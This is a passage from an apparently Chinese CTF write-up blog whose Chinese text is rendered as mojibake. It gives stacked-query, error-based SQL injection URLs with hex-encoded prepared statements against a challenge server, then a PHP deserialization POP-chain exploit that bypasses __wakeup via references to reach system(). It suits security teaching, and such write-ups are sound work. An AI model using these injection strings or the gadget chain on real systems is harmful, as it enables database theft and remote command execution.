MySQLdb<span class="token punctuation">.</span>OperationalError: <span class="token punctuation">(</span><span class="token number">1105</span><span class="token punctuation">,</span> <span class="token string">"XPATH syntax error: '~~flag,userinfo'"</span><span class="token punctuation">)</span>



<span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">"select extractvalue(1,concat(0x7e,0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='ctf' and table_name='flag')));"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2873656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F736368656D613D276374662720616E64207461626C655F6E616D653D27666C6167272929293B;prepare/**/aaa/**/from @c;execute/**/aaa;</span>

<span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>first_name<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>last_name<span class="token punctuation">)</span> <span class="token keyword">from</span> dvwa<span class="token punctuation">.</span>users<span class="token punctuation">)</span><span class="token punctuation">)</span>

hex<span class="token punctuation">(</span><span class="token string">"select extractvalue(1,concat(0x7e,0x7e,(select flag from ctf.flag)));"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

hex<span class="token punctuation">(</span><span class="token string">"select extractvalue(1,concat(0x7e,0x7e,substr((select flag from ctf.flag),29,30)));"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token number">0</span>xGame&#123;<span class="token number">4286</span>b62d<span class="token operator">-</span>c37e<span class="token operator">-</span><span class="token number">4010</span><span class="token operator">-</span>ba9c<span class="token operator">-</span><span class="token number">35</span>d47641fb91&#125;

http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C737562737472282873656C65637420666C61672066726F6D206374662E666C6167292C32392C33302929293B;prepare/**/aaa/**/from @c;execute/**/aaa;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Week-2-ez-unserialize"><a href="#Week-2-ez-unserialize" class="headerlink" title="[Week 2] ez_unserialize"></a>[Week 2] ez_unserialize</h2><p>è€ƒç‚¹ï¼šphpååºåˆ—åŒ–popé“¾æ„é€ ã€wakeupçš„ç»•è¿‡ã€‚<br>ä¸ä¼šï¼Œçœ‹çš„å®˜æ–¹wpã€‚ã€‚ã€‚<br><img src="https://img-blog.csdnimg.cn/4e1821de9476443b80fcf1ee06488bd7.png" alt="æç¤º"><br>è´´ä¸Šæºç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Cache</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$expired</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span> <span class="token operator">=</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>

        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span><span class="token operator">-></span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Storage</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$store</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">DataObject</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">storage</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>é¦–å…ˆæ‰¾åˆ°å…¥å£<code>__destruct()</code>ï¼Œåœ¨<code>DataObject ç±»é‡Œ</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">DataObject</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">storage</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™é‡Œä¼šéå†dataçš„å†…å®¹ï¼Œå°†keyå’Œvalueèµ‹å€¼ç»™storageï¼Œè§¦å‘ Storage çš„ <code>__set</code> æ–¹æ³•</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Storage</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$store</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™é‡Œå¦‚æœ<code>$store</code>ä¸ºç©ºï¼Œé‚£ä¹ˆå°±åˆå§‹åŒ–ä¸€ä¸ªç©ºçš„array()ï¼Œä¸‹ä¸€ä¸ªifè¯­å¥å°±æ˜¯è°ƒç”¨valueçš„expireæ–¹æ³•ï¼Œå¦‚æœè¿”å›falseå°±å°†valueæ”¾å…¥storeä¸­ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Cache</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$expired</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span> <span class="token operator">=</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>

        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">expired</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span><span class="token operator">-></span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>åœ¨Cacheç±»ä¸­expiredæ–¹æ³•ä¼šåˆ¤æ–­å†…éƒ¨çš„expiredå±æ€§æ˜¯å¦ä¸ºtrueï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ä¼šè°ƒç”¨helperçš„cleanæ–¹æ³•ï¼Œè€Œcleanå‘æ–¹æ³•ä¸å­˜åœ¨ï¼Œå®é™…ä¸Šå°±æ˜¯è°ƒç”¨<code>__call</code>æ–¹æ³•</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™é‡Œ<code>__call</code>ä¼šæŒ‰ç…§ä¼ å…¥çš„nameä»funcæ•°ç»„ä¸­å»é™¤å¯¹åº”çš„å‡½æ•°åï¼Œç„¶åå°†argsä½œä¸ºå‚æ•°æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œè¿™é‡Œå°±æ˜¯å­˜åœ¨getshellçš„åœ°æ–¹ã€‚<br>å¦‚æœè¦åˆ°è¾¾æœ€åçš„<code>__call</code>æ–¹æ³•ï¼Œéœ€è¦è®©Cacheç±»ä¸­çš„expiredå±æ€§ä¸ºtrueï¼Œä½†æ˜¯Cacheä¸­ä¼šå…ˆè§¦å‘wakeupæ–¹æ³•ï¼Œè¿™å°±ä½¿å¾—expiredä¸ºfalseï¼Œéœ€è¦å…ˆç»•è¿‡wakeupæ–¹æ³•<br>åŸæ¥æœ‰ä¸ªæ–°ç”Ÿèµ›å°±æœ‰è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œä½¿ç”¨phpå¼•ç”¨çš„æ¦‚å¿µ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>è¿™ä¸ªæ—¶å€™bçš„å€¼å°±ç­‰äºaçš„å€¼ï¼Œbçš„å€¼ä¸€æ—¦æ”¹å˜ï¼Œaçš„å€¼ä¹Ÿä¼šè·Ÿç€æ”¹å˜ã€‚aå’ŒbæŒ‡å‘ç›¸åŒçš„å†…å­˜åœ°å€</p>
<p>æˆ‘ä»¬å¯ä»¥è®©expiredå±æ€§æˆä¸ºæŸä¸ªå˜é‡çš„å¼•ç”¨ï¼Œè¿™æ ·å³ä½¿ç°åœ¨expiredå±æ€§å€¼ä¸ºfalseï¼Œä½†æ˜¯åé¢çš„è¿‡ç¨‹ä¸­ä¸€æ—¦æ”¹å˜å¼•ç”¨å˜é‡çš„å€¼ï¼Œexpired å±æ€§å€¼ä¹Ÿä¼šè¢«æ”¹å˜ï¼Œåªè¦å€¼ä¸æ˜¯nullï¼Œå°±ä¼šç»•è¿‡ifåˆ¤æ–­ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Cache</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$expired</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Storage</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$store</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">DataObject</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'clean'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$cache1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cache1</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>

<span class="token variable">$cache2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cache2</span><span class="token operator">-></span><span class="token property">helper</span> <span class="token operator">=</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>
<span class="token variable">$cache2</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'id'</span><span class="token punctuation">;</span>

<span class="token variable">$storage</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Storage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$storage</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$cache2</span><span class="token operator">-></span><span class="token property">expired</span><span class="token punctuation">;</span>

<span class="token variable">$dataObject</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dataObject</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'key1'</span> <span class="token operator">=></span> <span class="token variable">$cache1</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'key2'</span> <span class="token operator">=></span> <span class="token variable">$cache2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dataObject</span><span class="token operator">-></span><span class="token property">storage</span> <span class="token operator">=</span> <span class="token variable">$storage</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$dataObject</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>é¦–å…ˆå¾€DataObjectçš„dataé‡Œä¼ å…¥ä¸¤ä¸ªå®ä¾‹ï¼Œå…¶ä¸­ä¼ å…¥çš„cache2æŒ‡å®šäº†helperï¼Œkeyå€¼è®¾ç½®ä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œhelperçš„clean()ï¼ˆå®é™…ä¸Šæ˜¯<code>__call</code>çš„funcsæ•°ç»„ï¼‰æ”¾å…¥äº†systemå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œç„¶åè®©Storgeçš„storeå±æ€§æˆä¸ºcache2 expired å±æ€§çš„å¼•ç”¨</p>
